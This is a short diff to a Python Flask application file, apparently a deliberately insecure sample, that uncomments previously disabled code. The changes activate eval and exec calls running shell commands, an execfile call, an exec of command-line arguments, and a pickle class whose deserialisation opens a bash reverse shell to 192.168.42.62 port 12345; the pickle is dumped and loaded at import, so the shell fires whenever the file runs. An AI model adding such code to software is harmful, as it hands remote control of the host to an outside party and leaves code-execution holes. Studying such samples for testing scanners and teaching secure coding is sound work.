@@ -4,9 +4,9 @@ from flask import Flask
 import pickle
 import os
 import sys
-#eval("__import__('os').system('uname -a')")
-#exec("__import__('os').system('uname -a')")
-#execfile("test.py")
+eval("__import__('os').system('uname -a')")
+exec("__import__('os').system('uname -a')")
+execfile("test.py")
 
 app = Flask(__name__)
 
@@ -17,16 +17,16 @@ def index():
     #return redirect('http://' + name)
     return make_response(name, 200)
 
-#class exp(object):
-#    def __reduce__(self):
-#        s = "/bin/bash -c \"/bin/bash -i > \/dev/tcp/192.168.42.62/12345 0<&1 2>&1 &\""
-#        return (os.system, (s,))
+class exp(object):
+    def __reduce__(self):
+        s = "/bin/bash -c \"/bin/bash -i > \/dev/tcp/192.168.42.62/12345 0<&1 2>&1 &\""
+        return (os.system, (s,))
 
-#e = exp()
-#k = pickle.dumps(e)
-#pickle.loads(k)
+e = exp()
+k = pickle.dumps(e)
+pickle.loads(k)
 
-#exec(sys.argv[1:])
+exec(sys.argv[1:])
 
 if __name__ == '__main__':
     app.run()
